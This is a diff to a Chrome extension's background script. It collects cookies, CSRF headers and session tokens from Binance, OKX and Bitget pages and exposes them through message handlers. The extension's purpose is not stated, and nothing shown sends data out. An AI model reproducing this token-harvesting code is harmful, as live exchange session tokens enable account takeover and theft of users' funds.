@@ -18,7 +18,11 @@ function fetchCookiesForCurrentTab() {
     if (domain) {
       console.log("Current tab domain:", domain);
 
-      if (domain === "www.binance.com" || domain === "www.suitechsui.online") {
+      if (
+        domain.includes("binance.com") ||
+        domain.includes("okx.com") ||
+        domain.includes("bitget.com")
+      ) {
         fetchCookiesForDomain(domain);
       } else {
         console.warn("Domain not recognized or supported:", domain);
@@ -42,41 +46,29 @@ function fetchCookiesForDomain(domain: string) {
     }
     console.log("Cookies for domain:", domain, cookies);
 
+    // Store all cookies
     chrome.storage.local.set({ [`cookies_${domain}`]: cookies }, function () {
       console.log(`Cookies for ${domain} saved to storage`);
     });
-  });
-}
 
-// Listen to web requests and fetch cookies based on the current tab
-chrome.webRequest.onBeforeSendHeaders.addListener(
-  function (details) {
-    console.log("Intercepted Request:", details);
-
-    let csrfToken = null;
-    if (details.requestHeaders) {
-      for (let header of details.requestHeaders) {
-        if (header.name.toLowerCase() === "csrftoken") {
-          csrfToken = header.value;
-          console.log("CSRF Token Found:", csrfToken);
-
-          chrome.storage.local.set({ csrfToken: csrfToken }, function () {
-            console.log("CSRF Token saved to storage");
-          });
-          break;
-        }
+    // Handle specific JWT tokens from cookies
+    if (domain.includes("okx.com")) {
+      const jwtCookie = cookies.find((cookie) => cookie.name === "token");
+      if (jwtCookie) {
+        console.log("OKX JWT Token Found in cookies");
+        chrome.storage.local.set({ okx_jwt: jwtCookie.value });
+      }
+    } else if (domain.includes("bitget.com")) {
+      const jwtCookie = cookies.find(
+        (cookie) => cookie.name === "bt_newsessionid"
+      );
+      if (jwtCookie) {
+        console.log("Bitget JWT Token Found in cookies");
+        chrome.storage.local.set({ bitget_jwt: jwtCookie.value });
       }
     }
-    if (!csrfToken) {
-      console.warn("No CSRF Token found in request headers");
-    }
-
-    // Fetch cookies for the current active tab's domain
-    fetchCookiesForCurrentTab();
-  },
-  { urls: ["https://www.binance.com/*", "https://www.suitechsui.online/*"] },
-  ["requestHeaders"]
-);
+  });
+}
 
 // Listen for messages from the popup
 chrome.runtime.onMessage.addListener((message, _sender, sendResponse) => {
@@ -91,4 +83,65 @@ chrome.runtime.onMessage.addListener((message, _sender, sendResponse) => {
     });
     return true; // Will respond asynchronously
   }
+
+  if (message.type === "GET_CSRF_TOKEN") {
+    chrome.storage.local.get(["csrfToken"], (items) => {
+      sendResponse(items.csrfToken);
+    });
+    return true;
+  }
+
+  if (message.type === "GET_JWT_TOKENS") {
+    chrome.storage.local.get(null, (items) => {
+      const jwtTokens: { [key: string]: string } = {};
+
+      // Check for OKX JWT token
+      if (items.okx_jwt) {
+        jwtTokens["okx"] = items.okx_jwt;
+      }
+
+      // Check for Bitget JWT token
+      if (items.bitget_jwt) {
+        jwtTokens["bitget"] = items.bitget_jwt;
+      }
+
+      sendResponse(jwtTokens);
+    });
+    return true;
+  }
 });
+
+// Listen to web requests and fetch cookies/tokens based on the current tab
+chrome.webRequest.onBeforeSendHeaders.addListener(
+  function (details) {
+    console.log("Intercepted Request:", details);
+
+    // Extract CSRF token from headers
+    if (details.requestHeaders) {
+      for (let header of details.requestHeaders) {
+        if (header.name.toLowerCase() === "csrftoken") {
+          console.log("CSRF Token Found:", header.value);
+          chrome.storage.local.set({ csrfToken: header.value });
+          break;
+        }
+      }
+    }
+
+    // Fetch cookies for all supported domains
+    if (
+      details.url.includes("binance.com") ||
+      details.url.includes("okx.com") ||
+      details.url.includes("bitget.com")
+    ) {
+      fetchCookiesForCurrentTab();
+    }
+  },
+  {
+    urls: [
+      "https://www.binance.com/*",
+      "https://www.okx.com/*",
+      "https://www.bitget.com/*",
+    ],
+  },
+  ["requestHeaders"]
+);
